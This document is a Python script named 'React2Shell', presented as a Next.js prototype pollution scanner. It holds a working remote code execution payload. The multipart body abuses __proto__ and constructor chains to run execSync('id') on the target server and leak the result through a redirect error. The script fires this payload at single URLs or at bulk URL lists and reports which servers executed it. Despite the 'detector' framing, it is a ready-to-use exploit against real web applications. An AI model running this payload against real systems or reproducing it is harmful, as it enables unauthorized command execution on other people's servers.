from logging import exception
import sys
import requests
import re
from datetime import datetime


# ANSI Color codes
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    GRAY = '\033[90m'


def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║              ██████╗ ███████╗ █████╗  ██████╗████████╗   ║
║              ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝   ║
║              ██████╔╝█████╗  ███████║██║        ██║      ║
║              ██╔══██╗██╔══╝  ██╔══██║██║        ██║      ║
║              ██║  ██║███████╗██║  ██║╚██████╗   ██║      ║
║              ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝      ║
║                                                           ║
║                   2 SHELL SCANNER v1.0  
                    (by Maimo Harris)║
║            Next.js Prototype Pollution Detector           ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
{Colors.ENDC}"""
    print(banner)


def print_help():
    help_text = f"""
{Colors.CYAN}{Colors.BOLD}Usage:{Colors.ENDC}
    {Colors.YELLOW}React2Shell.py [option] [value]{Colors.ENDC}

{Colors.CYAN}{Colors.BOLD}Options:{Colors.ENDC}
    {Colors.GREEN}-u, --url{Colors.ENDC}    Test a single URL
    {Colors.GREEN}-l, --list{Colors.ENDC}   Test multiple URLs from a file
    {Colors.GREEN}-h, --help{Colors.ENDC}   Display this help message

{Colors.CYAN}{Colors.BOLD}Examples:{Colors.ENDC}
    {Colors.GRAY}# Test single URL{Colors.ENDC}
    {Colors.YELLOW}python React2Shell.py -u https://example.com/{Colors.ENDC}

    {Colors.GRAY}# Test multiple URLs from file{Colors.ENDC}
    {Colors.YELLOW}python React2Shell.py -l urls.txt{Colors.ENDC}
"""
    print(help_text)


def print_section_divider(char="═", length=80):
    print(f"{Colors.GRAY}{char * length}{Colors.ENDC}")


def print_result_header(url):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n{Colors.BLUE}{Colors.BOLD}{'═' * 80}{Colors.ENDC}")
    print(f"{Colors.CYAN}{Colors.BOLD}🎯 Target:{Colors.ENDC} {Colors.YELLOW}{url}{Colors.ENDC}")
    print(f"{Colors.GRAY}⏰ Time: {timestamp}{Colors.ENDC}")
    print(f"{Colors.BLUE}{Colors.BOLD}{'═' * 80}{Colors.ENDC}\n")


def print_vulnerability_status(is_vulnerable, status_code):
    if is_vulnerable:
        print(f"{Colors.RED}{Colors.BOLD}⚠️  VULNERABILITY DETECTED! ⚠️{Colors.ENDC}")
        print(f"{Colors.RED}[!] This website is vulnerable to prototype pollution!{Colors.ENDC}")
    else:
        print(f"{Colors.GREEN}{Colors.BOLD}✓ No Vulnerability Detected{Colors.ENDC}")
        print(f"{Colors.GREEN}[✓] This site appears to be secure.{Colors.ENDC}")

    status_color = Colors.GREEN if status_code == 200 else Colors.YELLOW if status_code < 500 else Colors.RED
    print(f"\n{Colors.CYAN}📊 HTTP Status:{Colors.ENDC} {status_color}{status_code}{Colors.ENDC}")


def print_response_preview(response_text):
    print(f"\n{Colors.CYAN}{Colors.BOLD}📄 Response Preview:{Colors.ENDC}")
    preview = response_text[:500] + "..." if len(response_text) > 500 else response_text
    print(f"{Colors.GRAY}{preview}{Colors.ENDC}")


def print_result_footer():
    print(f"\n{Colors.BLUE}{Colors.BOLD}{'═' * 80}{Colors.ENDC}\n")


def print_error(error_msg, url):
    print(f"\n{Colors.RED}{Colors.BOLD}❌ Error Testing {url}{Colors.ENDC}")
    print(f"{Colors.RED}[!] {error_msg}{Colors.ENDC}\n")


def print_summary(total, vulnerable, failed):
    print(f"\n{Colors.CYAN}{Colors.BOLD}{'═' * 80}{Colors.ENDC}")
    print(f"{Colors.CYAN}{Colors.BOLD}📊 SCAN SUMMARY{Colors.ENDC}")
    print(f"{Colors.CYAN}{Colors.BOLD}{'═' * 80}{Colors.ENDC}")
    print(f"{Colors.YELLOW}Total URLs Tested:{Colors.ENDC} {total}")
    print(f"{Colors.RED}Vulnerable Sites:{Colors.ENDC} {vulnerable}")
    print(f"{Colors.GREEN}Secure Sites:{Colors.ENDC} {total - vulnerable - failed}")
    print(f"{Colors.GRAY}Failed Requests:{Colors.ENDC} {failed}")
    print(f"{Colors.CYAN}{Colors.BOLD}{'═' * 80}{Colors.ENDC}\n")


# Original headers and data
headers = {
    "User-Agent": "Mobile Kitkat",
    "Next-Action": "x",
    "X-Nextjs-Request-Id": "b5dce965",
    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad",
    "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
    "Content-Length": "740"
}

data = """
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
"""


def test_url(url):
    try:
        print_result_header(url)
        print(f"{Colors.YELLOW}⏳ Sending payload...{Colors.ENDC}")

        response = requests.post(url.strip(), headers=headers, data=data, timeout=10)
        pattern = r"uid=1000\((.*?)\)"
        match = re.search(pattern, response.text)

        print_vulnerability_status(match is not None, response.status_code)
        print_response_preview(response.text)
        print_result_footer()

        return match is not None, False
    except Exception as e:
        print_error(str(e), url)
        return False, True


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print_banner()
        print_help()
        sys.exit(1)

    option = sys.argv[1]

    if option == "-h" or option == "--help":
        print_banner()
        print_help()

    elif option == "-u" or option == "--url":
        if len(sys.argv) < 3:
            print(f"{Colors.RED}Error: URL argument required{Colors.ENDC}")
            sys.exit(1)

        print_banner()
        url = sys.argv[2]
        test_url(url)

    elif option == "-l" or option == "--list":
        if len(sys.argv) < 3:
            print(f"{Colors.RED}Error: File path argument required{Colors.ENDC}")
            sys.exit(1)

        print_banner()
        urls_file = sys.argv[2]

        try:
            with open(urls_file, 'r') as urlsfile:
                urls = [line.strip() for line in urlsfile if line.strip()]
                total = len(urls)
                vulnerable = 0
                failed = 0

                print(f"{Colors.CYAN}📋 Loaded {total} URLs from {urls_file}{Colors.ENDC}\n")

                for idx, url in enumerate(urls, 1):
                    print(f"{Colors.YELLOW}[{idx}/{total}]{Colors.ENDC} Testing {url}...")
                    is_vuln, is_failed = test_url(url)
                    if is_vuln:
                        vulnerable += 1
                    if is_failed:
                        failed += 1

                print_summary(total, vulnerable, failed)
        except FileNotFoundError:
            print(f"{Colors.RED}Error: File '{urls_file}' not found{Colors.ENDC}")
            sys.exit(1)

    else:
        print(f"{Colors.RED}Error: Unknown option '{option}'{Colors.ENDC}")
        print_help()
        sys.exit(1)
